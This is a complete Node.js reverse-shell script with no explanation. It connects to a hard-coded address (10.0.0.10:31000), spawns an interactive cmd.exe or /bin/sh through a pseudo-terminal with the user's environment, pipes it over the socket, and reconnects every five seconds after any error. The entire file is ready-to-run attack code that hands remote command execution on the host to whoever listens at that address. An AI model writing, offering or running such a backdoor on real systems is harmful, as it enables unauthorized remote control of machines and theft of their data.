"use strict"

let net = require('net')
let spawn = require('child_process').spawn
let pty = require('pty.js')

const HOST = "10.0.0.10",
      PORT = 31000,
      TIMEOUT = 5000,
      shellCmd = process.platform.match(/^win/i) ? 'cmd.exe' : '/bin/sh'

function reverse(host, port) {
  let client = new net.Socket()
  client.connect(port, host, function() {
    // process.stdin.setRawMode(true);
    let term = pty.spawn(shellCmd, [], {
      name: 'xterm-color',
      cols: 80,
      rows: 40,
      cwd: process.env.HOME,
      env: process.env
    })
    client.pipe(term)
    term.pipe(client)
  })

  client.on('error', function() {
    console.log('error'),
    setTimeout(()=>reverse(host, port), TIMEOUT)
  })
}

reverse(HOST, PORT)
